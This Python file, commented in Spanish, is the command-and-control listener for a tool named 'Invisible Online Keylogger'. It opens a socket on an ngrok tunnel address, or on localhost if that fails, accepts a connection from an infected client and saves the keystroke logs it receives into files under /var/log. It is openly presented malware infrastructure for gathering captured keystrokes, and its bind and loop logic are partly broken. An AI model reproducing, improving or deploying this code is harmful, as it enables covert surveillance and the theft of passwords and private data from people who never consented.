import socket
import art
from colorama import Fore

# Función para obtener la dirección y el puerto de Ngrok
def get_ngrok_address():
    # Modificar la dirección y el puerto según el túnel Ngrok
    host = '0.tcp.ngrok.io'
    port = 12345
    return host, port

# Artístico
artpost = art.text2art("Invisible Online Keylogger")

# Información
def info():
    print(Fore.RED, ' Creado por:  ---> Basil Abdulrahman')
    print(Fore.LIGHTBLACK_EX, 'Version 1.0')
    print(Fore.GREEN)

# Función para nombrar manualmente los archivos de registro
def manName():
    while True:
        filename = input('Elija un nombre para el archivo entrante\n')
        filename = '/var/log/' + filename + '.txt'  # Cambiar la ruta según tu entorno
        file = open(filename, 'wb')
        data = conn.recv(10000000)
        file.write(data)
        file.close()
        print(Fore.GREEN, '\nArchivo de registro creado con éxito.')

# Función para nombrar automáticamente los archivos de registro
def autoName():
    for i in range(1, 50):
        filename = '/var/log/' + f'log{i}.txt'  # Cambiar la ruta según tu entorno
        file = open(filename, 'wb')
        data = conn.recv(16777216)
        file.write(data)
        file.close()
        print(Fore.GREEN, '\nArchivo de registro creado con éxito.')

# Título
print(Fore.GREEN + artpost)

# Información
info()

# TCP Server utilizando Sockets, esperando conexiones de solo un cliente.
repeat = True
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
hostname = socket.gethostname()
print(Fore.CYAN, f'Nombre del host: {hostname}')

# Intentar conectarse a la dirección de Ngrok
try:
    ngrok_address = get_ngrok_address()
    s.bind(ngrok_address)
    print('Esperando conexiones...')
    s.listen(1)
    conn, addr = s.accept()
    print(Fore.LIGHTRED_EX, addr, 'se ha conectado al servidor')
except Exception as e:
    print(Fore.RED, "Error al conectar con Ngrok:", e)
    print(Fore.YELLOW, "Intentando conectar al localhost en el puerto 8080")
    s.bind(('localhost', 8080))  # Intentar conectar a localhost en un puerto específico
    s.listen(1)
    conn, addr = s.accept()
    print(Fore.LIGHTRED_EX, addr, 'se ha conectado al servidor')

# Después de inicializar la conexión, elige nombrar los archivos de registro manual o automáticamente, con manejo de errores
print(Fore.YELLOW, "¿Deseas nombrar los archivos manualmente o automáticamente?\n1- Nombramiento automático\n2- Nombramiento manual")
while repeat:
    try:
        nc = input('Ingresa 1 o 2:\n')
        if nc == '1':
            repeat = False
            autoName()
        elif nc == '2':
            repeat = False
            manName()
        else:
            raise Exception
    except:
        print('¡Solo se permiten 1 o 2!')
        continue
